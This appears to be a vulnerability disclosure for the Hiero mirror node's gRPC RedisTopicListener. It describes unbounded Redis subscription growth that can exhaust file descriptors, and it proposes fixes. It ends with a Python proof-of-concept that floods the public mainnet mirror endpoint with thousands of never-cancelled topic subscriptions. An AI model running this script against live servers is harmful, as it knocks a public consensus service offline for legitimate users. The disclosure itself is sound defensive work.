### Title
Unbounded Redis Channel Subscription Growth via Unique Topic ID Flooding in `RedisTopicListener`

### Summary
`RedisTopicListener.getSharedListener()` uses an unbounded `ConcurrentHashMap` keyed by topic string. Each unique topic ID causes `computeIfAbsent` to invoke `subscribe(topic)`, which opens a new Redis pub/sub channel subscription backed by a live `Flux` with `.share()`. Because there is no cap on the map size, no rate limiting on the gRPC layer, and no limit on the number of inbound connections, an unauthenticated attacker can drive unbounded growth of Redis channel subscriptions, exhausting file descriptors and native memory until the process crashes.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java`, lines 59–62:
```java
protected Flux<TopicMessage> getSharedListener(TopicMessageFilter filter) {
    Topic topic = getTopic(filter);
    return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
}
```

`subscribe()` (lines 68–79) calls `r.receive(...)` on the `ReactiveRedisMessageListenerContainer`, which opens a Redis pub/sub channel subscription. The `.share()` operator keeps the `Flux` — and the underlying Redis subscription — alive as long as at least one subscriber holds it. The entry is only removed from `topicMessages` via `unsubscribe()` (lines 82–85) when `doOnCancel` or `doOnComplete` fires, i.e., only when every subscriber to that shared `Flux` has disconnected.

**Root cause:** The `topicMessages` map is a plain `ConcurrentHashMap` with no size bound. There is no global cap on the number of concurrent Redis channel subscriptions, no rate limiting on the gRPC endpoint, and no limit on the number of inbound gRPC connections.

**Exploit flow:**

1. `ConsensusController.subscribeTopic()` (lines 43–53 of `ConsensusController.java`) accepts any `ConsensusTopicQuery` from any unauthenticated caller and passes it to `TopicMessageServiceImpl.subscribeTopic()`.
2. `TopicMessageServiceImpl` calls `topicExists()` (lines 94–106), which checks `entityRepository.findById`. With `checkTopicExists = true` (default in `GrpcProperties.java` line 19), only valid topic IDs pass. However, Hedera topic IDs are sequential public integers, trivially enumerable from the public ledger or mirror node REST API.
3. For each valid, unique topic ID, `getSharedListener` inserts a new entry into `topicMessages` and opens a new Redis channel subscription.
4. The attacker opens many TCP connections to the gRPC port. `NettyProperties.maxConcurrentCallsPerConnection = 5` (line 14) limits calls *per connection*, but there is no limit on the number of connections. With N connections × 5 calls each, the attacker accumulates 5N live Redis subscriptions.
5. By keeping each gRPC stream open (never cancelling), `doOnCancel` never fires, so `unsubscribe()` is never called and the map entries are never evicted.

**Why existing checks fail:**

- `maxConcurrentCallsPerConnection = 5` is a per-connection limit, not a global limit. An attacker opens thousands of connections.
- `checkTopicExists = true` requires valid topic IDs, but these are publicly enumerable — the Hedera mirror node REST API (`/api/v1/topics`) exposes them without authentication.
- There is no authentication, no IP-based rate limiting, no maximum subscriber count, and no cap on `topicMessages` map size anywhere in the gRPC module. The throttle infrastructure (`ThrottleConfiguration`, `ThrottleManagerImpl`) exists only in the `web3` module and is not applied to gRPC.

### Impact Explanation
Each Redis channel subscription consumes a file descriptor and native memory. A single JVM process has a finite FD limit (typically 65535 on Linux). Exhausting FDs causes `java.io.IOException: Too many open files`, crashing the gRPC server. Because the `topicMessages` map also holds strong references to each `Flux` and its associated `ReactiveRedisMessageListenerContainer` state, heap and native memory are also consumed. Crashing 30%+ of gRPC mirror node instances disrupts HCS (Hedera Consensus Service) message delivery for all legitimate users of the network.

### Likelihood Explanation
The attack requires no credentials, no special protocol knowledge beyond the public gRPC protobuf schema (published in the Hedera SDK), and no brute force. Valid topic IDs are publicly enumerable. The attacker needs only a script that opens many TCP connections and sends `subscribeTopic` RPCs with distinct valid topic IDs while keeping streams open. This is repeatable, automatable, and achievable from a single machine or a small botnet.

### Recommendation
1. **Cap the `topicMessages` map**: Replace `ConcurrentHashMap` with a bounded structure (e.g., Caffeine cache with a maximum size and eviction policy) so that the number of concurrent Redis subscriptions is bounded.
2. **Add a global subscriber/subscription limit**: Track total active subscriptions with an `AtomicInteger` and reject new subscriptions above a configurable threshold.
3. **Rate-limit gRPC connections and RPCs**: Apply IP-based connection rate limiting at the Netty layer or via an ingress proxy (e.g., Envoy), analogous to the `ThrottleConfiguration` already present in the `web3` module.
4. **Limit connections per IP**: Configure `NettyServerBuilder` with a maximum number of connections or connections-per-IP.
5. **Enforce subscription TTL**: Subscriptions with no `endTime` and no messages received for a configurable idle period should be forcibly cancelled.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.hashgraph.sdk.proto import consensus_service_pb2_grpc, consensus_service_pb2
from com.hedera.hashgraph.sdk.proto import basic_types_pb2, timestamp_pb2

MIRROR_GRPC = "mirror.mainnet.hedera.com:443"
# Enumerate valid topic IDs from REST API: GET /api/v1/topics?limit=1000
VALID_TOPIC_IDS = list(range(1, 10001))  # 10,000 known valid topic IDs

def flood_subscription(topic_num):
    channel = grpc.secure_channel(MIRROR_GRPC, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=topic_num),
        # No endTime, no limit — stream stays open indefinitely
    )
    try:
        for _ in stub.subscribeTopic(query):
            pass  # consume but never cancel
    except Exception:
        pass

threads = []
for tid in VALID_TOPIC_IDS:
    t = threading.Thread(target=flood_subscription, args=(tid,), daemon=True)
    t.start()
    threads.append(t)

# Keep all threads alive — each holds a live gRPC stream and a Redis subscription
for t in threads:
    t.join()
```
Each thread holds a live gRPC stream open. The mirror node accumulates one Redis channel subscription per unique `tid`, growing `topicMessages` without bound until FD exhaustion crashes the process.
